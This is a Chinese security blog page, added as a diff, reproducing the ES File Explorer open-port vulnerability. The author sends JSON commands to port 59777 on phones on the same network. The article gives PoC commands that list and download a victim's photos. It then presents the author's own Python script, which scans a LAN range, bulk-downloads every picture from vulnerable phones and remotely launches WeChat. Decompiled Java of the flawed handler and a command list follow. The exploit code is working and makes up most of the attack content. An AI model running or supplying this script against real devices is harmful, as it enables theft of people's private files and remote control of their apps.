@@ -1,0 +1,1467 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="threst">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="threst">
+    <meta name="keywords" content="Hexo | threst">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>ES文件浏览器漏洞复现 · threst&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+        
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >threst&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">ES文件浏览器漏洞复现</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>threst's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/10.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            ES文件浏览器漏洞复现
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "apt">apt</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2019/01/23</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>文章首发<a href="https://xz.aliyun.com/t/3934" target="_blank" rel="noopener">先知社区</a>，未经允许，禁止转载</p>
+<p>今天上网的时候看到一个<a href="https://twitter.com/fs0c131y/status/1085461301588094976" target="_blank" rel="noopener">新闻</a>,ES文件浏览器存在漏洞，同一个网络下的用户可以直接访问安装了ＥＳ的用户手机上的文件，正好我手机上也安装了es，于是就测试了下。</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><strong>poc<a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">地址</a></strong>下载</p>
+<p><strong>ip</strong>:</p>
+<p>开始是192.168.0.100</p>
+<p>后来有事去了，再连就是192.168.0.102</p>
+<p><strong>版本号</strong>:4.1.9.4</p>
+<h1 id="0x00验证漏洞"><a href="#0x00验证漏洞" class="headerlink" title="0x00验证漏洞"></a>0x00验证漏洞</h1><p>首先电脑和手机处于同一个网络，再查看我的手机ip,和es的版本</p>
+<p><img src="https://www.superbed.cn/pic/5c43dafa5f3e509ed9435a81" alt=""></p>
+<p><img src="https://www.superbed.cn/pic/5c43dafa5f3e509ed9435a83" alt=""></p>
+<p>执行命令<code>python poc.py poc.py --cmd getDeviceInfo --network  192.168.0.</code></p>
+<p><img src="https://www.superbed.cn/pic/5c4682be5f3e509ed9518d11" alt=""></p>
+<h1 id="0x01分析原理"><a href="#0x01分析原理" class="headerlink" title="0x01分析原理"></a>0x01分析原理</h1><p>看了各位大佬的分析，小白我大概知道了原理，就是向手机发送一个json的数据包,我们使用大佬的<a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">脚本</a>,想手机发送一个数据包，抓包分析一下</p>
+<p><img src="https://www.superbed.cn/pic/5c4689a55f3e509ed951bee4" alt=""></p>
+<p>确实是发送了一个json的数据包</p>
+<h1 id="0x02获取受害者手机图片"><a href="#0x02获取受害者手机图片" class="headerlink" title="0x02获取受害者手机图片"></a>0x02获取受害者手机图片</h1><p>首先列出受害者手机所有图片</p>
+<p><code>python poc.py --cmd listPics</code></p>
+<p><img src="https://www.superbed.cn/pic/5c43de555f3e509ed9436bb7" alt=""></p>
+<p>可以看到很多手机图片</p>
+<h1 id="0x03下载受害者图片"><a href="#0x03下载受害者图片" class="headerlink" title="0x03下载受害者图片"></a>0x03下载受害者图片</h1><p>我们随便从刚才获得的列表中挑一张下载试试</p>
+<p><code>python poc.py -g /storage/emulated/0/DCIM/Camera/IMG_20181218_175120.jpg</code></p>
+<p><img src="https://www.superbed.cn/pic/5c43e1575f3e509ed9437a06" alt=""></p>
+<p>成功将图片下载到本地</p>
+<h1 id="0x04造个轮子"><a href="#0x04造个轮子" class="headerlink" title="0x04造个轮子"></a>0x04造个轮子</h1><p>玩了下大佬的脚本，确实厉害，但是发现一个问题，就是他的脚本会自动扫描局域网所有的ip，这样就会很浪费时间,所以本着练习python编程的想法，自己又造了个轮子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">addrs = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> range(<span class="number">101</span>, <span class="number">104</span>):</span><br><span class="line">        addr = <span class="string">"192.168.0."</span>+str(ip)</span><br><span class="line">        s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s.connect_ex((addr, <span class="number">59777</span>)):</span><br><span class="line">            s.close()</span><br><span class="line">            print(<span class="string">"[+]"</span>+addr+<span class="string">"存在漏洞"</span>)</span><br><span class="line">            addrs.append(addr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            s.close()</span><br><span class="line">    print(<span class="string">"[+]扫描结束\n[+]执行操作"</span>+sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    poc()</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> addrs:</span><br><span class="line">        headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">        address = <span class="string">'http://'</span> + addr + <span class="string">':59777'</span></span><br><span class="line">        data = <span class="string">'&#123; "command":'</span> + cmd + <span class="string">' &#125;'</span></span><br><span class="line">        r = requests.post(address, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">'listPics'</span>:<span class="comment">#下载图片</span></span><br><span class="line">            image = re.compile(<span class="string">r'/s.*jpg'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span>  image.findall(r.text):</span><br><span class="line">                imageurl =  address  + i            </span><br><span class="line">                filename = i.rsplit(<span class="string">'/'</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">                r = requests.get(imageurl, headers=headers)</span><br><span class="line">                print(<span class="string">"[+]正在下载"</span>+i)</span><br><span class="line">                <span class="keyword">with</span> open(filename, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(r.content)</span><br><span class="line">                    <span class="comment">#break</span></span><br><span class="line">        <span class="keyword">elif</span> cmd == <span class="string">'wx'</span>:<span class="comment">#启动微信</span></span><br><span class="line">            data = <span class="string">'&#123;"command":"appLaunch", "appPackageName": "com.tencent.mm"&#125;'</span></span><br><span class="line">            r = requests.post(address, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            print(r.text)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        cmd(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'Usage:'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py wx'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listPics'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listApps'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listAudios'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listVideos'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listAppsPhone'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py getDeviceInfo'</span>)</span><br><span class="line">        print(<span class="string">'python3 es.py listAppsAll'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>添加了一键下载所有图片，启动微信等功能,大致原理就是去请求资源的地址，只要符合APP的方法就行,具体方法参考漏洞路径<code>4.1.84class2.-dex2jar.jar\com\estrongs\android\f\a.class</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> c.<span class="function">b <span class="title">a</span><span class="params">(String paramString1, String paramString2, Properties paramProperties1, Properties paramProperties2, Properties paramProperties3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (paramString1.startsWith(<span class="string">"/estrongs_filemgr_oauth_result"</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString1 = CreateOAuthNetDisk.b();</span><br><span class="line">    <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) &#123;</span><br><span class="line">      paramString1.a(paramProperties2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (paramString2.equals(<span class="string">"POST"</span>))<span class="comment">//判断发送方法是否为POST</span></span><br><span class="line">  &#123;</span><br><span class="line">    localObject = <span class="keyword">new</span> String(g());</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      localObject = <span class="keyword">new</span> JSONObject((String)localObject);<span class="comment">//JSONG解码</span></span><br><span class="line">      String str = ((JSONObject)localObject).getString(<span class="string">"command"</span>);<span class="comment">//获取JSON中command字段值</span></span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listFiles"</span>)) &#123;<span class="comment">//获取文件列表</span></span><br><span class="line">        <span class="keyword">return</span> b(paramString1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listPics"</span>)) &#123;<span class="comment">//获取图片列表</span></span><br><span class="line">        <span class="keyword">return</span> d();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listVideos"</span>)) &#123;<span class="comment">//获取视频列表</span></span><br><span class="line">        <span class="keyword">return</span> e();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAudios"</span>)) &#123;<span class="comment">//获取音频列表</span></span><br><span class="line">        <span class="keyword">return</span> f();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listApps"</span>)) &#123;<span class="comment">//获取软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsSystem"</span>)) &#123;<span class="comment">//获取系统软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsPhone"</span>)) &#123;<span class="comment">//获取电话软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsSdcard"</span>)) &#123;<span class="comment">//获取安装在SD卡中的软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">3</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsAll"</span>)) &#123;<span class="comment">//获取全部APP</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"getAppThumbnail"</span>)) &#123;<span class="comment">//获取APP缩略图</span></span><br><span class="line">        <span class="keyword">return</span> d((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"appLaunch"</span>)) &#123;<span class="comment">//启动APP</span></span><br><span class="line">        <span class="keyword">return</span> a((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"appPull"</span>)) &#123;<span class="comment">//下载APP</span></span><br><span class="line">        <span class="keyword">return</span> c((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"getDeviceInfo"</span>))<span class="comment">//获取设备信息</span></span><br><span class="line">      &#123;</span><br><span class="line">        paramString1 = b((JSONObject)localObject);</span><br><span class="line">        <span class="keyword">return</span> paramString1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (JSONException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      paramString1.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, paramString1.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  Object localObject = ah.bL(paramString1);</span><br><span class="line">  <span class="keyword">if</span> ((localObject == <span class="keyword">null</span>) || (ah.I((String)localObject) == <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (localObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">super</span>.a(paramString1, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.a((String)localObject, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">  &#125;</span><br><span class="line">  paramString1 = paramProperties1.getProperty(<span class="string">"range"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((paramString1 != <span class="keyword">null</span>) &amp;&amp; (paramString1.startsWith(<span class="string">"bytes="</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString2 = paramString1.substring(<span class="string">"bytes="</span>.length());</span><br><span class="line">    <span class="keyword">int</span> i = paramString2.indexOf(<span class="string">'-'</span>);</span><br><span class="line">    paramString1 = paramString2;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      paramString1 = paramString2.substring(<span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      l = Long.parseLong(paramString1);</span><br><span class="line">      <span class="keyword">return</span> a((String)localObject, l, <span class="number">0L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NumberFormatException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      l = <span class="number">0L</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> l = <span class="number">0L</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x05其他功能"><a href="#0x05其他功能" class="headerlink" title="0x05其他功能"></a>0x05其他功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">listFiles：列出所有文件</span><br><span class="line">listPics：列出所有图片</span><br><span class="line">listVideos：列出所有视频</span><br><span class="line">listAudios：列出所有音频文件</span><br><span class="line">listApps：列出所有已安装的应用</span><br><span class="line">listAppsSystem：列出所有系统应用</span><br><span class="line">listAppsPhone：列出所有手机应用</span><br><span class="line">listAppsSdcard：列出所有sdcard </span><br><span class="line">listAppsAll：列出安装的所有应用程序（包括系统应用程序）</span><br><span class="line">getDeviceInfo：获取设备信息</span><br><span class="line">appPull：从设备中提取应用程序。需要包名称参数</span><br><span 